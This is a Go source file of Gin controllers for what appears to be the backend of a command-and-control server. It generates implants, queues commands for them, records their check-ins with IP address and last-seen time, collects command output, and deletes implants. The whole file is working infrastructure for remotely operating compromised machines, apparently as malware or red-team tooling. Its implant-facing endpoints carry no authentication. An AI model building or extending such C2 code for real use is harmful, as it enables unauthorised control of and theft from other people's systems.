package controllers

import (
	"awesomeProject/config"
	"awesomeProject/database"
	"awesomeProject/models"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"time"
)

// GetUserImplants returns all implants owned by the current user.
func GetUserImplants(c *gin.Context) {
	// Get the current user ID from the context (set by your AuthMiddleware)
	userID := c.MustGet("user_id").(int)

	// Query the database for implants owned by the user
	implants, err := database.GetImplantsByUserID(userID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch implants"})
		return
	}

	// Return the list of implants
	c.JSON(http.StatusOK, gin.H{
		"implants": implants,
	})
}

// SendCommand sends a command to a specific implant, ensuring it is owned by the current user.
func SendCommand(c *gin.Context) {
	// Get the current user ID from the context
	userID := c.MustGet("user_id").(int)

	// Extract the implant ID and command from the request body
	var request struct {
		ImplantID string `json:"implant_id"`
		Command   string `json:"command"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return // Stop execution after sending the error response
	}

	// Verify that the implant is owned by the current user
	implant, err := database.GetImplantByID(request.ImplantID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch implant"})
		return // Stop execution after sending the error response
	}

	if implant.UserID != userID {
		c.JSON(http.StatusForbidden, gin.H{"error": "You do not own this implant"})
		return // Stop execution after sending the error response
	}

	// Create a new command
	newCommand := models.Command{
		ImplantID: request.ImplantID,
		Command:   request.Command,
		Status:    "pending", // Default status
	}

	// Insert the new command into the database
	result := config.DB.Create(&newCommand)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to send command"})
		return // Stop execution after sending the error response
	}

	// Send the command to the implant (you would implement this logic)
	// For now, we'll just log the command and return a success response.
	c.JSON(http.StatusOK, gin.H{
		"message":    "Command sent successfully",
		"implant_id": request.ImplantID,
		"command":    request.Command,
	})
	// No need for a return statement here, as this is the end of the function
}

func GetCommandsForImplant(c *gin.Context) {
	// Extract the implant ID from the path parameter
	implantID := c.Param("implant_id")
	fmt.Println(implantID)
	if implantID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID is required"})
		return
	}

	// Fetch all commands for the implant
	commands, err := database.GetCommandsByImplantID(implantID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch commands"})
		return
	}

	// Return the commands to the client
	c.JSON(http.StatusOK, gin.H{
		"commands": commands,
	})
}

// In controllers/implant_controllers.go
func HandleCommandResult(c *gin.Context) {
	// Extract the command ID and result from the request
	var request struct {
		CommandID int    `json:"command_id"`
		Output    string `json:"output"`
	}
	fmt.Println(request)
	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}

	status, err := database.GetCommandStatus(request.CommandID)

	if err != nil {

		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch command status"})
		return
	}

	if status == "executed" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Command already executed"})
		return
	}
	fmt.Println(request.CommandID)
	fmt.Println(request.Output)
	// Mark the command as executed and store the output
	err = database.MarkCommandAsExecuted(request.CommandID, request.Output)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update command status"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"message": "Command result received successfully",
	})
}

func GenerateImplant(c *gin.Context) {
	// Extract userID from context (set by AuthMiddleware)
	userID, exists := c.Get("user_id")
	if !exists {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Unauthorized: Missing user ID"})
		return
	}

	// Ensure userID is correctly casted to int
	uid, ok := userID.(int)
	if !ok {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Invalid user ID format"})
		return
	}
	// Call database function to create the implant for the user
	implant, err := database.CreateImplant(uid)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate implant"})
		return
	}

	// Return the generated implant details
	c.JSON(http.StatusOK, gin.H{
		"message":      "Implant generated successfully",
		"unique_token": implant.UniqueToken,
		"implant_id":   implant.ID,
		"status":       implant.Status,
	})
}

func CheckinImplant(c *gin.Context) {
	var request struct {
		UniqueToken string `json:"implant_id"`
		IPAddress   string `json:"ip_address"`
	}

	// Bind JSON request body
	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}

	// Find the implant by its unique_token
	var implant models.Implant
	result := config.DB.Where("unique_token = ?", request.UniqueToken).First(&implant)

	if result.Error != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}

	// Update implant status and mark as deployed
	implant.Status = "online"
	implant.Deployed = true
	implant.IPAddress = request.IPAddress
	implant.LastSeen = time.Now()

	// Save changes to the database
	config.DB.Save(&implant)

	c.JSON(http.StatusOK, gin.H{
		"message":   "Check-in successful",
		"status":    implant.Status,
		"deployed":  implant.Deployed,
		"last_seen": implant.LastSeen,
	})
}

func DeleteImplant(c *gin.Context) {
	// Extract the implant unique token from the URL
	uniqueToken := c.Param("implant_id")

	// Ensure the user is authenticated
	userID, exists := c.Get("user_id")
	if !exists {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Unauthorized"})
		return
	}

	// Find the implant by unique token and ensure it belongs to the user
	var implant models.Implant
	result := config.DB.Where("unique_token = ? AND user_id = ?", uniqueToken, userID).First(&implant)
	if result.Error != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}

	// Delete the implant
	config.DB.Delete(&implant)

	c.JSON(http.StatusOK, gin.H{"message": "Implant deleted successfully"})
}
